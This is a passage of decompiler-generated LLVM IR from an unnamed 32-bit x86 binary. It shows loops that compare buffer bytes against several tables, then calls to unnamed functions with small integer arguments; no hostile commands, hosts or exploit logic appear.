  %v2_804eb2b = add i32 %v1_804eb1c, -16
  %v3_804eb2b = inttoptr i32 %v2_804eb2b to i32*
  store i32 %v3_804eb27, i32* %v3_804eb2b, align 4
  %v5_804eb2c = call i32 @function_8052d1c(i32 0, i32* nonnull @0, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v5_804eb2c, i32* %eax.global-to-local, align 4
  %v0_804eb31 = load i32, i32* @esp, align 4
  store i32 %v5_804eb2c, i32* @ebx, align 4
  %tmp114 = icmp slt i32 %v5_804eb2c, 1
  br i1 %tmp114, label %dec_label_pc_804ed27, label %dec_label_pc_804eb3e

dec_label_pc_804eb3e:                             ; preds = %dec_label_pc_804eb1c
  %v1_804eb31 = add i32 %v0_804eb31, 16
  %v1_804eb3e = add i32 %v0_804eb31, 8436
  %v2_804eb3e = inttoptr i32 %v1_804eb3e to i32*
  %v3_804eb3e = load i32, i32* %v2_804eb3e, align 4
  store i32 %v3_804eb3e, i32* %eax.global-to-local, align 4
  %v2_804eb45 = inttoptr i32 %v1_804eb31 to i32*
  store i32 %v3_804eb3e, i32* %v2_804eb45, align 4
  %v0_804eb48 = load i32, i32* @ebx, align 4
  %v1_804eb48 = load i32, i32* %eax.global-to-local, align 4
  %v2_804eb48 = sub i32 %v0_804eb48, %v1_804eb48
  %v8_804eb48 = xor i32 %v1_804eb48, %v0_804eb48
  %v9_804eb48 = xor i32 %v2_804eb48, %v0_804eb48
  %v10_804eb48 = and i32 %v9_804eb48, %v8_804eb48
  %v11_804eb48 = icmp slt i32 %v10_804eb48, 0
  %v13_804eb48 = icmp slt i32 %v2_804eb48, 0
  %v2_804eb4a = icmp eq i1 %v13_804eb48, %v11_804eb48
  br i1 %v2_804eb4a, label %dec_label_pc_804eb4c, label %dec_label_pc_804eb3e.dec_label_pc_804eb78_crit_edge

dec_label_pc_804eb3e.dec_label_pc_804eb78_crit_edge: ; preds = %dec_label_pc_804eb3e
  %v0_804eb78.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_804eb78

dec_label_pc_804eb4c:                             ; preds = %dec_label_pc_804eb3e
  %v0_804eb51 = load i32, i32* @esp, align 4
  %v10_804eb55 = icmp eq i32 %v0_804eb48, 0
  br i1 %v10_804eb55, label %dec_label_pc_804eb78, label %dec_label_pc_804eb60.preheader

dec_label_pc_804eb60.preheader:                   ; preds = %dec_label_pc_804eb4c
  %v1_804eb51 = add i32 %v0_804eb51, 56
  %v1_804eb60 = add i32 %v0_804eb51, 36
  %v2_804eb60 = inttoptr i32 %v1_804eb60 to i32*
  %v1_804ec51 = inttoptr i32 %v0_804eb51 to i32*
  br label %dec_label_pc_804eb60

dec_label_pc_804eb60:                             ; preds = %dec_label_pc_804eb60.preheader, %dec_label_pc_804eb71
  %v0_804eb71.in = phi i32 [ %v0_804eb71, %dec_label_pc_804eb71 ], [ %v0_804eb48, %dec_label_pc_804eb60.preheader ]
  %v0_804ec50 = phi i32 [ %v3_804eb6661, %dec_label_pc_804eb71 ], [ 0, %dec_label_pc_804eb60.preheader ]
  %v4_804eb64 = phi i32 [ %v6_804eb64, %dec_label_pc_804eb71 ], [ %v1_804eb48, %dec_label_pc_804eb60.preheader ]
  %v0_804eb72 = phi i32 [ %v1_804eb72, %dec_label_pc_804eb71 ], [ %v1_804eb51, %dec_label_pc_804eb60.preheader ]
  %v0_804eb71 = add i32 %v0_804eb71.in, -1
  %v3_804eb60 = load i32, i32* %v2_804eb60, align 4
  store i32 %v3_804eb60, i32* @edi, align 4
  %v1_804eb64 = inttoptr i32 %v0_804eb72 to i8*
  %v2_804eb64 = load i8, i8* %v1_804eb64, align 1
  %v3_804eb64 = zext i8 %v2_804eb64 to i32
  %v5_804eb64 = and i32 %v4_804eb64, -256
  %v6_804eb64 = or i32 %v3_804eb64, %v5_804eb64
  store i32 %v6_804eb64, i32* %eax.global-to-local, align 4
  %v4_804eb66 = add i32 %v3_804eb60, %v0_804ec50
  %v5_804eb66 = inttoptr i32 %v4_804eb66 to i8*
  %v6_804eb66 = load i8, i8* %v5_804eb66, align 1
  %v17_804eb66 = icmp eq i8 %v2_804eb64, %v6_804eb66
  br i1 %v17_804eb66, label %dec_label_pc_804ec50, label %dec_label_pc_804eb6f

dec_label_pc_804eb6f:                             ; preds = %dec_label_pc_804eb60
  br label %dec_label_pc_804eb71

dec_label_pc_804eb71:                             ; preds = %dec_label_pc_804ec50, %dec_label_pc_804eb6f
  %v3_804eb6661 = phi i32 [ %v1_804ec50, %dec_label_pc_804ec50 ], [ 0, %dec_label_pc_804eb6f ]
  %v1_804eb72 = add i32 %v0_804eb72, 1
  %v10_804eb73 = icmp eq i32 %v0_804eb71, 0
  %v1_804eb76 = icmp eq i1 %v10_804eb73, false
  br i1 %v1_804eb76, label %dec_label_pc_804eb60, label %dec_label_pc_804eb78

dec_label_pc_804eb78:                             ; preds = %dec_label_pc_804eb71, %dec_label_pc_804eb3e.dec_label_pc_804eb78_crit_edge, %dec_label_pc_804eb4c
  %v0_804eb78 = phi i32 [ %v0_804eb78.pre, %dec_label_pc_804eb3e.dec_label_pc_804eb78_crit_edge ], [ %v0_804eb51, %dec_label_pc_804eb4c ], [ %v0_804eb51, %dec_label_pc_804eb71 ]
  %v1_804eb78 = add i32 %v0_804eb78, 8416
  %v2_804eb78 = inttoptr i32 %v1_804eb78 to i32*
  %v3_804eb78 = load i32, i32* %v2_804eb78, align 4
  store i32 %v3_804eb78, i32* %eax.global-to-local, align 4
  %v2_804eb7f = inttoptr i32 %v0_804eb78 to i32*
  store i32 %v3_804eb78, i32* %v2_804eb7f, align 4
  %v0_804eb82 = load i32, i32* @ebx, align 4
  %v1_804eb82 = load i32, i32* %eax.global-to-local, align 4
  %v2_804eb82 = sub i32 %v0_804eb82, %v1_804eb82
  %v8_804eb82 = xor i32 %v1_804eb82, %v0_804eb82
  %v9_804eb82 = xor i32 %v2_804eb82, %v0_804eb82
  %v10_804eb82 = and i32 %v9_804eb82, %v8_804eb82
  %v11_804eb82 = icmp slt i32 %v10_804eb82, 0
  %v13_804eb82 = icmp slt i32 %v2_804eb82, 0
  %v2_804eb84 = icmp eq i1 %v13_804eb82, %v11_804eb82
  br i1 %v2_804eb84, label %dec_label_pc_804eb86, label %dec_label_pc_804eb78.dec_label_pc_804ebac_crit_edge

dec_label_pc_804eb78.dec_label_pc_804ebac_crit_edge: ; preds = %dec_label_pc_804eb78
  %v0_804ebac.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_804ebac

dec_label_pc_804eb86:                             ; preds = %dec_label_pc_804eb78
  %v0_804eb8b = load i32, i32* @esp, align 4
  %v10_804eb8f = icmp eq i32 %v0_804eb82, 0
  br i1 %v10_804eb8f, label %dec_label_pc_804ebac, label %dec_label_pc_804eb94.preheader

dec_label_pc_804eb94.preheader:                   ; preds = %dec_label_pc_804eb86
  %v1_804eb8b = add i32 %v0_804eb8b, 56
  %v1_804eb94 = add i32 %v0_804eb8b, 32
  %v2_804eb94 = inttoptr i32 %v1_804eb94 to i32*
  %v1_804ece9 = inttoptr i32 %v0_804eb8b to i32*
  br label %dec_label_pc_804eb94

dec_label_pc_804eb94:                             ; preds = %dec_label_pc_804eb94.preheader, %dec_label_pc_804eba6
  %v0_804eba6.in = phi i32 [ %v0_804eba6, %dec_label_pc_804eba6 ], [ %v0_804eb82, %dec_label_pc_804eb94.preheader ]
  %v0_804ece8 = phi i32 [ %v3_804eb9a69, %dec_label_pc_804eba6 ], [ 0, %dec_label_pc_804eb94.preheader ]
  %v4_804eb98 = phi i32 [ %v6_804eb98, %dec_label_pc_804eba6 ], [ %v1_804eb82, %dec_label_pc_804eb94.preheader ]
  %v0_804ecf2 = phi i32 [ %v1_804eba5, %dec_label_pc_804eba6 ], [ %v1_804eb8b, %dec_label_pc_804eb94.preheader ]
  %v0_804eba6 = add i32 %v0_804eba6.in, -1
  %v3_804eb94 = load i32, i32* %v2_804eb94, align 4
  store i32 %v3_804eb94, i32* @edi, align 4
  %v1_804eb98 = inttoptr i32 %v0_804ecf2 to i8*
  %v2_804eb98 = load i8, i8* %v1_804eb98, align 1
  %v3_804eb98 = zext i8 %v2_804eb98 to i32
  %v5_804eb98 = and i32 %v4_804eb98, -256
  %v6_804eb98 = or i32 %v3_804eb98, %v5_804eb98
  store i32 %v6_804eb98, i32* %eax.global-to-local, align 4
  %v4_804eb9a = add i32 %v3_804eb94, %v0_804ece8
  %v5_804eb9a = inttoptr i32 %v4_804eb9a to i8*
  %v6_804eb9a = load i8, i8* %v5_804eb9a, align 1
  %v17_804eb9a = icmp eq i8 %v2_804eb98, %v6_804eb9a
  br i1 %v17_804eb9a, label %dec_label_pc_804ece8, label %dec_label_pc_804eba3

dec_label_pc_804eba3:                             ; preds = %dec_label_pc_804eb94
  br label %dec_label_pc_804eba6

dec_label_pc_804eba6:                             ; preds = %dec_label_pc_804ece8, %dec_label_pc_804eba3
  %v3_804eb9a69 = phi i32 [ 0, %dec_label_pc_804eba3 ], [ %v1_804ece8, %dec_label_pc_804ece8 ]
  %v1_804eba5 = add i32 %v0_804ecf2, 1
  %v10_804eba7 = icmp eq i32 %v0_804eba6, 0
  %v1_804ebaa = icmp eq i1 %v10_804eba7, false
  br i1 %v1_804ebaa, label %dec_label_pc_804eb94, label %dec_label_pc_804ebac

dec_label_pc_804ebac:                             ; preds = %dec_label_pc_804eba6, %dec_label_pc_804eb78.dec_label_pc_804ebac_crit_edge, %dec_label_pc_804eb86
  %v0_804ebac = phi i32 [ %v0_804ebac.pre, %dec_label_pc_804eb78.dec_label_pc_804ebac_crit_edge ], [ %v0_804eb8b, %dec_label_pc_804eb86 ], [ %v0_804eb8b, %dec_label_pc_804eba6 ]
  %v1_804ebac = add i32 %v0_804ebac, 8412
  %v2_804ebac = inttoptr i32 %v1_804ebac to i32*
  %v3_804ebac = load i32, i32* %v2_804ebac, align 4
  store i32 %v3_804ebac, i32* %eax.global-to-local, align 4
  %v2_804ebb3 = inttoptr i32 %v0_804ebac to i32*
  store i32 %v3_804ebac, i32* %v2_804ebb3, align 4
  %v0_804ebb6 = load i32, i32* @ebx, align 4
  %v1_804ebb6 = load i32, i32* %eax.global-to-local, align 4
  %v2_804ebb6 = sub i32 %v0_804ebb6, %v1_804ebb6
  %v8_804ebb6 = xor i32 %v1_804ebb6, %v0_804ebb6
  %v9_804ebb6 = xor i32 %v2_804ebb6, %v0_804ebb6
  %v10_804ebb6 = and i32 %v9_804ebb6, %v8_804ebb6
  %v11_804ebb6 = icmp slt i32 %v10_804ebb6, 0
  %v13_804ebb6 = icmp slt i32 %v2_804ebb6, 0
  %v2_804ebb8 = icmp eq i1 %v13_804ebb6, %v11_804ebb6
  br i1 %v2_804ebb8, label %dec_label_pc_804ebba, label %dec_label_pc_804ebac.dec_label_pc_804ebe0_crit_edge

dec_label_pc_804ebac.dec_label_pc_804ebe0_crit_edge: ; preds = %dec_label_pc_804ebac
  %v0_804ebe0.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_804ebe0

dec_label_pc_804ebba:                             ; preds = %dec_label_pc_804ebac
  %v0_804ebbf = load i32, i32* @esp, align 4
  %v10_804ebc3 = icmp eq i32 %v0_804ebb6, 0
  br i1 %v10_804ebc3, label %dec_label_pc_804ebe0, label %dec_label_pc_804ebc8.preheader

dec_label_pc_804ebc8.preheader:                   ; preds = %dec_label_pc_804ebba
  %v1_804ebbf = add i32 %v0_804ebbf, 56
  %v1_804ebc8 = add i32 %v0_804ebbf, 28
  %v2_804ebc8 = inttoptr i32 %v1_804ebc8 to i32*
  %v1_804ecf9 = inttoptr i32 %v0_804ebbf to i32*
  br label %dec_label_pc_804ebc8

dec_label_pc_804ebc8:                             ; preds = %dec_label_pc_804ebc8.preheader, %dec_label_pc_804ebda
  %v0_804ebda.in = phi i32 [ %v0_804ebda, %dec_label_pc_804ebda ], [ %v0_804ebb6, %dec_label_pc_804ebc8.preheader ]
  %v0_804ecf8 = phi i32 [ %v3_804ebce77, %dec_label_pc_804ebda ], [ 0, %dec_label_pc_804ebc8.preheader ]
  %v4_804ebcc = phi i32 [ %v6_804ebcc, %dec_label_pc_804ebda ], [ %v1_804ebb6, %dec_label_pc_804ebc8.preheader ]
  %v0_804ed02 = phi i32 [ %v1_804ebd9, %dec_label_pc_804ebda ], [ %v1_804ebbf, %dec_label_pc_804ebc8.preheader ]
  %v0_804ebda = add i32 %v0_804ebda.in, -1
  %v3_804ebc8 = load i32, i32* %v2_804ebc8, align 4
  store i32 %v3_804ebc8, i32* @edi, align 4
  %v1_804ebcc = inttoptr i32 %v0_804ed02 to i8*
  %v2_804ebcc = load i8, i8* %v1_804ebcc, align 1
  %v3_804ebcc = zext i8 %v2_804ebcc to i32
  %v5_804ebcc = and i32 %v4_804ebcc, -256
  %v6_804ebcc = or i32 %v3_804ebcc, %v5_804ebcc
  store i32 %v6_804ebcc, i32* %eax.global-to-local, align 4
  %v4_804ebce = add i32 %v3_804ebc8, %v0_804ecf8
  %v5_804ebce = inttoptr i32 %v4_804ebce to i8*
  %v6_804ebce = load i8, i8* %v5_804ebce, align 1
  %v17_804ebce = icmp eq i8 %v2_804ebcc, %v6_804ebce
  br i1 %v17_804ebce, label %dec_label_pc_804ecf8, label %dec_label_pc_804ebd7

dec_label_pc_804ebd7:                             ; preds = %dec_label_pc_804ebc8
  br label %dec_label_pc_804ebda

dec_label_pc_804ebda:                             ; preds = %dec_label_pc_804ecf8, %dec_label_pc_804ebd7
  %v3_804ebce77 = phi i32 [ 0, %dec_label_pc_804ebd7 ], [ %v1_804ecf8, %dec_label_pc_804ecf8 ]
  %v1_804ebd9 = add i32 %v0_804ed02, 1
  %v10_804ebdb = icmp eq i32 %v0_804ebda, 0
  %v1_804ebde = icmp eq i1 %v10_804ebdb, false
  br i1 %v1_804ebde, label %dec_label_pc_804ebc8, label %dec_label_pc_804ebe0

dec_label_pc_804ebe0:                             ; preds = %dec_label_pc_804ebda, %dec_label_pc_804ebac.dec_label_pc_804ebe0_crit_edge, %dec_label_pc_804ebba
  %v0_804ebe0 = phi i32 [ %v0_804ebe0.pre, %dec_label_pc_804ebac.dec_label_pc_804ebe0_crit_edge ], [ %v0_804ebbf, %dec_label_pc_804ebba ], [ %v0_804ebbf, %dec_label_pc_804ebda ]
  %v1_804ebe0 = add i32 %v0_804ebe0, 8424
  %v2_804ebe0 = inttoptr i32 %v1_804ebe0 to i32*
  %v3_804ebe0 = load i32, i32* %v2_804ebe0, align 4
  store i32 %v3_804ebe0, i32* %eax.global-to-local, align 4
  %v2_804ebe7 = inttoptr i32 %v0_804ebe0 to i32*
  store i32 %v3_804ebe0, i32* %v2_804ebe7, align 4
  %v0_804ebea = load i32, i32* @ebx, align 4
  %v1_804ebea = load i32, i32* %eax.global-to-local, align 4
  %v2_804ebea = sub i32 %v0_804ebea, %v1_804ebea
  %v8_804ebea = xor i32 %v1_804ebea, %v0_804ebea
  %v9_804ebea = xor i32 %v2_804ebea, %v0_804ebea
  %v10_804ebea = and i32 %v9_804ebea, %v8_804ebea
  %v11_804ebea = icmp slt i32 %v10_804ebea, 0
  %v13_804ebea = icmp slt i32 %v2_804ebea, 0
  %v2_804ebec = icmp eq i1 %v13_804ebea, %v11_804ebea
  br i1 %v2_804ebec, label %dec_label_pc_804ebee, label %dec_label_pc_804ebe0.dec_label_pc_804ec18_crit_edge

dec_label_pc_804ebe0.dec_label_pc_804ec18_crit_edge: ; preds = %dec_label_pc_804ebe0
  %v0_804ec18.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_804ec18

dec_label_pc_804ebee:                             ; preds = %dec_label_pc_804ebe0
  %v0_804ebf3 = load i32, i32* @esp, align 4
  %v10_804ebf7 = icmp eq i32 %v0_804ebea, 0
  br i1 %v10_804ebf7, label %dec_label_pc_804ec18, label %dec_label_pc_804ec00.preheader

dec_label_pc_804ec00.preheader:                   ; preds = %dec_label_pc_804ebee
  %v1_804ebf3 = add i32 %v0_804ebf3, 56
  %v1_804ec00 = add i32 %v0_804ebf3, 24
  %v2_804ec00 = inttoptr i32 %v1_804ec00 to i32*
  %v1_804ed09 = inttoptr i32 %v0_804ebf3 to i32*
  br label %dec_label_pc_804ec00

dec_label_pc_804ec00:                             ; preds = %dec_label_pc_804ec00.preheader, %dec_label_pc_804ec12
  %v0_804ec12.in = phi i32 [ %v0_804ec12, %dec_label_pc_804ec12 ], [ %v0_804ebea, %dec_label_pc_804ec00.preheader ]
  %v0_804ed08 = phi i32 [ %v3_804ec0685, %dec_label_pc_804ec12 ], [ 0, %dec_label_pc_804ec00.preheader ]
  %v4_804ec04 = phi i32 [ %v6_804ec04, %dec_label_pc_804ec12 ], [ %v1_804ebea, %dec_label_pc_804ec00.preheader ]
  %v0_804ed12 = phi i32 [ %v1_804ec11, %dec_label_pc_804ec12 ], [ %v1_804ebf3, %dec_label_pc_804ec00.preheader ]
  %v0_804ec12 = add i32 %v0_804ec12.in, -1
  %v3_804ec00 = load i32, i32* %v2_804ec00, align 4
  store i32 %v3_804ec00, i32* @edi, align 4
  %v1_804ec04 = inttoptr i32 %v0_804ed12 to i8*
  %v2_804ec04 = load i8, i8* %v1_804ec04, align 1
  %v3_804ec04 = zext i8 %v2_804ec04 to i32
  %v5_804ec04 = and i32 %v4_804ec04, -256
  %v6_804ec04 = or i32 %v3_804ec04, %v5_804ec04
  store i32 %v6_804ec04, i32* %eax.global-to-local, align 4
  %v4_804ec06 = add i32 %v3_804ec00, %v0_804ed08
  %v5_804ec06 = inttoptr i32 %v4_804ec06 to i8*
  %v6_804ec06 = load i8, i8* %v5_804ec06, align 1
  %v17_804ec06 = icmp eq i8 %v2_804ec04, %v6_804ec06
  br i1 %v17_804ec06, label %dec_label_pc_804ed08, label %dec_label_pc_804ec0f

dec_label_pc_804ec0f:                             ; preds = %dec_label_pc_804ec00
  br label %dec_label_pc_804ec12

dec_label_pc_804ec12:                             ; preds = %dec_label_pc_804ed08, %dec_label_pc_804ec0f
  %v3_804ec0685 = phi i32 [ 0, %dec_label_pc_804ec0f ], [ %v1_804ed08, %dec_label_pc_804ed08 ]
  %v1_804ec11 = add i32 %v0_804ed12, 1
  %v10_804ec13 = icmp eq i32 %v0_804ec12, 0
  %v1_804ec16 = icmp eq i1 %v10_804ec13, false
  br i1 %v1_804ec16, label %dec_label_pc_804ec00, label %dec_label_pc_804ec18

dec_label_pc_804ec18:                             ; preds = %dec_label_pc_804ec12, %dec_label_pc_804ebe0.dec_label_pc_804ec18_crit_edge, %dec_label_pc_804ebee
  %v0_804ec27 = phi i32 [ %v0_804ec18.pre, %dec_label_pc_804ebe0.dec_label_pc_804ec18_crit_edge ], [ %v0_804ebf3, %dec_label_pc_804ebee ], [ %v0_804ebf3, %dec_label_pc_804ec12 ]
  %v0_804eb1c52 = phi i32 [ %v1_804ebea, %dec_label_pc_804ebe0.dec_label_pc_804ec18_crit_edge ], [ %v1_804ebea, %dec_label_pc_804ebee ], [ %v6_804ec04, %dec_label_pc_804ec12 ]
  %v1_804ec18 = add i32 %v0_804ec27, 8408
  %v2_804ec18 = inttoptr i32 %v1_804ec18 to i32*
  %v3_804ec18 = load i32, i32* %v2_804ec18, align 4
  %v2_804ec1f = sub i32 %v0_804ebea, %v3_804ec18
  %v8_804ec1f = xor i32 %v3_804ec18, %v0_804ebea
  %v9_804ec1f = xor i32 %v2_804ec1f, %v0_804ebea
  %v10_804ec1f = and i32 %v9_804ec1f, %v8_804ec1f
  %v11_804ec1f = icmp slt i32 %v10_804ec1f, 0
  %v13_804ec1f = icmp slt i32 %v2_804ec1f, 0
  %v2_804ec21 = icmp eq i1 %v13_804ec1f, %v11_804ec1f
  br i1 %v2_804ec21, label %dec_label_pc_804ec27, label %dec_label_pc_804eb1c

dec_label_pc_804ec27:                             ; preds = %dec_label_pc_804ec18
  %v1_804ec30126 = add i32 %v0_804ebea, -1
  store i32 %v1_804ec30126, i32* @ebx, align 4
  %v10_804ec31127 = icmp eq i32 %v0_804ebea, 0
  br i1 %v10_804ec31127, label %dec_label_pc_804eb1c, label %dec_label_pc_804ec3a.lr.ph

dec_label_pc_804ec3a.lr.ph:                       ; preds = %dec_label_pc_804ec27
  %v1_804ec27 = add i32 %v0_804ec27, 56
  %v1_804ec3a = add i32 %v0_804ec27, 20
  %v2_804ec3a = inttoptr i32 %v1_804ec3a to i32*
  br label %dec_label_pc_804ec3a

dec_label_pc_804ec3a:                             ; preds = %dec_label_pc_804ec3a.lr.ph, %dec_label_pc_804ec30.backedge
  %v1_804ec30131 = phi i32 [ %v1_804ec30126, %dec_label_pc_804ec3a.lr.ph ], [ %v1_804ec30, %dec_label_pc_804ec30.backedge ]
  %v4_804ec3e130 = phi i32 [ %v0_804eb1c52, %dec_label_pc_804ec3a.lr.ph ], [ %v6_804ec3e, %dec_label_pc_804ec30.backedge ]
  %v0_804ed21129 = phi i32 [ %v1_804ec27, %dec_label_pc_804ec3a.lr.ph ], [ %storemerge32.in, %dec_label_pc_804ec30.backedge ]
  %v0_804ed18128 = phi i32 [ 0, %dec_label_pc_804ec3a.lr.ph ], [ %v3_804ec4091, %dec_label_pc_804ec30.backedge ]
  %v3_804ec3a = load i32, i32* %v2_804ec3a, align 4
  store i32 %v3_804ec3a, i32* @edi, align 4
  %v1_804ec3e = inttoptr i32 %v0_804ed21129 to i8*
  %v2_804ec3e = load i8, i8* %v1_804ec3e, align 1
  %v3_804ec3e = zext i8 %v2_804ec3e to i32
  %v5_804ec3e = and i32 %v4_804ec3e130, -256
  %v6_804ec3e = or i32 %v3_804ec3e, %v5_804ec3e
  store i32 %v6_804ec3e, i32* %eax.global-to-local, align 4
  %v4_804ec40 = add i32 %v3_804ec3a, %v0_804ed18128
  %v5_804ec40 = inttoptr i32 %v4_804ec40 to i8*
  %v6_804ec40 = load i8, i8* %v5_804ec40, align 1
  %v17_804ec40 = icmp eq i8 %v2_804ec3e, %v6_804ec40
  br i1 %v17_804ec40, label %dec_label_pc_804ed18, label %dec_label_pc_804ec49

dec_label_pc_804ec49:                             ; preds = %dec_label_pc_804ec3a
  br label %dec_label_pc_804ec30.backedge

dec_label_pc_804ec50:                             ; preds = %dec_label_pc_804eb60
  %v1_804ec50 = add i32 %v0_804ec50, 1
  %v2_804ec51 = load i32, i32* %v1_804ec51, align 4
  %v14_804ec51 = icmp eq i32 %v2_804ec51, %v1_804ec50
  %v1_804ec54 = icmp eq i1 %v14_804ec51, false
  br i1 %v1_804ec54, label %dec_label_pc_804eb71, label %dec_label_pc_804ec5a

dec_label_pc_804ec5a:                             ; preds = %dec_label_pc_804ec50, %dec_label_pc_804ece8, %dec_label_pc_804ecf8, %dec_label_pc_804ed08, %dec_label_pc_804ed18
  %v0_804ec5a = phi i32 [ %v0_804ec27, %dec_label_pc_804ed18 ], [ %v0_804ebf3, %dec_label_pc_804ed08 ], [ %v0_804ebbf, %dec_label_pc_804ecf8 ], [ %v0_804eb8b, %dec_label_pc_804ece8 ], [ %v0_804eb51, %dec_label_pc_804ec50 ]
  %v1_804ec5d = add i32 %v0_804ec5a, -16
  %v2_804ec5d = inttoptr i32 %v1_804ec5d to i32*
  store i32 12, i32* %v2_804ec5d, align 4
  %v2_804ec5f = call i32 @function_8051c10(i8 0)
  store i32 %v2_804ec5f, i32* %eax.global-to-local, align 4
  %v0_804ec64 = load i32, i32* @esp, align 4
  %v1_804ec64 = inttoptr i32 %v0_804ec64 to i32*
  store i32 13, i32* %v1_804ec64, align 4
  %v2_804ec6b = call i32 @function_8051c10(i8 0)
  store i32 %v2_804ec6b, i32* %eax.global-to-local, align 4
  %v0_804ec70 = load i32, i32* @esp, align 4
  %v1_804ec70 = inttoptr i32 %v0_804ec70 to i32*
  store i32 14, i32* %v1_804ec70, align 4
  %v2_804ec77 = call i32 @function_8051c10(i8 0)
  store i32 %v2_804ec77, i32* %eax.global-to-local, align 4
  %v0_804ec7c = load i32, i32* @esp, align 4
  %v1_804ec7c = inttoptr i32 %v0_804ec7c to i32*
  store i32 15, i32* %v1_804ec7c, align 4
  %v2_804ec83 = call i32 @function_8051c10(i8 0)
  store i32 %v2_804ec83, i32* %eax.global-to-local, align 4
  %v0_804ec88 = load i32, i32* @esp, align 4
  %v1_804ec88 = inttoptr i32 %v0_804ec88 to i32*
  store i32 16, i32* %v1_804ec88, align 4
  %v2_804ec8f = call i32 @function_8051c10(i8 0)
  store i32 %v2_804ec8f, i32* %eax.global-to-local, align 4
  %v0_804ec94 = load i32, i32* @esp, align 4
  %v1_804ec94 = inttoptr i32 %v0_804ec94 to i32*
  %v2_804ec94 = load i32, i32* %v1_804ec94, align 4
  store i32 %v2_804ec94, i32* %eax.global-to-local, align 4
  %v1_804ec95 = add i32 %v0_804ec94, 56
  %v2_804ec95 = inttoptr i32 %v1_804ec95 to i32*
  %v3_804ec95 = load i32, i32* %v2_804ec95, align 4
  store i32 %v3_804ec95, i32* @edi, align 4
  store i32 %v3_804ec95, i32* %v1_804ec94, align 4
  %v1_804ec9a = call i32 @function_8052b81(i32 0)
  store i32 %v1_804ec9a, i32* %eax.global-to-local, align 4
  %v0_804ec9f = load i32, i32* @esp, align 4
  %v1_804ec9f = inttoptr i32 %v0_804ec9f to i32*
  %v2_804ec9f = load i32, i32* %v1_804ec9f, align 4
  store i32 %v2_804ec9f, i32* @ebx, align 4
  %v3_804ec9f = add i32 %v0_804ec9f, 4
  %v1_804eca0 = inttoptr i32 %v3_804ec9f to i32*
  store i32 9, i32* %v1_804eca0, align 4
  %v0_804eca3 = load i32, i32* @ebp, align 4
  store i32 %v0_804eca3, i32* %v1_804ec9f, align 4
  %v4_804eca4 = call i32 @function_8052c60(i32 0, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_804eca4, i32* @eax, align 4
  %v0_804eca9 = load i32, i32* @esp, align 4
  br label %dec_label_pc_804ecac

dec_label_pc_804ecac:                             ; preds = %dec_label_pc_804ea57, %dec_label_pc_804ed27, %dec_label_pc_804ec5a
  %v1_804ecac.in = phi i32 [ %v0_804ea6c, %dec_label_pc_804ea57 ], [ %v0_804ed6c, %dec_label_pc_804ed27 ], [ %v0_804eca9, %dec_label_pc_804ec5a ]
  %v0_804ecac = load i32, i32* @ecx, align 4
  %v2_804ecac = add i32 %v1_804ecac.in, 12
  %v3_804ecac = inttoptr i32 %v2_804ecac to i32*
  store i32 %v0_804ecac, i32* %v3_804ecac, align 4
  %v0_804ecad = load i32, i32* @ecx, align 4
  %v2_804ecad = add i32 %v1_804ecac.in, 8
  %v3_804ecad = inttoptr i32 %v2_804ecad to i32*
  store i32 %v0_804ecad, i32* %v3_804ecad, align 4
  %v1_804ecae = add i32 %v1_804ecac.in, 4
  %v2_804ecae = inttoptr i32 %v1_804ecae to i32*
  store i32 64, i32* %v2_804ecae, align 4
  %v0_804ecb0 = load i32, i32* @ebp, align 4
  store i32 %v0_804ecb0, i32* @esi, align 4
  %v1_804ecb2 = add i32 %v1_804ecac.in, 8328
  store i32 %v1_804ecb2, i32* @edi, align 4
  %v3_804ecb9 = inttoptr i32 %v1_804ecac.in to i32*
  store i32 %v1_804ecb2, i32* %v3_804ecb9, align 4
  %v2_804ecba = call i32 @function_8052670(i32 0, i32 ptrtoint (i32* @0 to i32))
  store i32 %v2_804ecba, i32* %eax.global-to-local, align 4
  %v0_804ecbf = load i32, i32* @esp, align 4
  %v1_804ecbf = inttoptr i32 %v0_804ecbf to i32*
  %v2_804ecbf = load i32, i32* %v1_804ecbf, align 4
  store i32 %v2_804ecbf, i32* %eax.global-to-local, align 4
  %v3_804ecbf = add i32 %v0_804ecbf, 4
  %v1_804ecc0 = inttoptr i32 %v3_804ecbf to i32*
  store i32 64, i32* %v1_804ecc0, align 4
  %v1_804ecc3 = add i32 %v0_804ecbf, 8264
  store i32 %v1_804ecc3, i32* @eax, align 4
  store i32 %v1_804ecc3, i32* %v1_804ecbf, align 4
  %v2_804eccb = call i32 @function_8052670(i32 0, i32 ptrtoint (i32* @0 to i32))
  store i32 %v2_804eccb, i32* %eax.global-to-local, align 4
  %v0_804ecd0 = load i32, i32* @esp, align 4
  %v1_804ecd0 = inttoptr i32 %v0_804ecd0 to i32*
  store i32 1, i32* %v1_804ecd0, align 4
  %v1_804ecd7 = call i32 @function_8054730(i32 0)
  store i32 %v1_804ecd7, i32* %eax.global-to-local, align 4
  %v0_804ecdc = load i32, i32* @esp, align 4
  %v1_804ecdc = add i32 %v0_804ecdc, 24
  %v2_804ecdc = inttoptr i32 %v1_804ecdc to i32*
  %v3_804ecdc = load i32, i32* %v2_804ecdc, align 4
  store i32 %v3_804ecdc, i32* @ebx, align 4
  %v1_804ece0 = add i32 %v0_804ecdc, 16
  br label %dec_label_pc_804e7e0

dec_label_pc_804ece8:                             ; preds = %dec_label_pc_804eb94
  %v1_804ece8 = add i32 %v0_804ece8, 1
  %v2_804ece9 = load i32, i32* %v1_804ece9, align 4
  %v14_804ece9 = icmp eq i32 %v2_804ece9, %v1_804ece8
  br i1 %v14_804ece9, label %dec_label_pc_804ec5a, label %dec_label_pc_804eba6

dec_label_pc_804ecf8:                             ; preds = %dec_label_pc_804ebc8
  %v1_804ecf8 = add i32 %v0_804ecf8, 1
  %v2_804ecf9 = load i32, i32* %v1_804ecf9, align 4
  %v14_804ecf9 = icmp eq i32 %v2_804ecf9, %v1_804ecf8
  br i1 %v14_804ecf9, label %dec_label_pc_804ec5a, label %dec_label_pc_804ebda

dec_label_pc_804ed08:                             ; preds = %dec_label_pc_804ec00
  %v1_804ed08 = add i32 %v0_804ed08, 1
  %v2_804ed09 = load i32, i32* %v1_804ed09, align 4
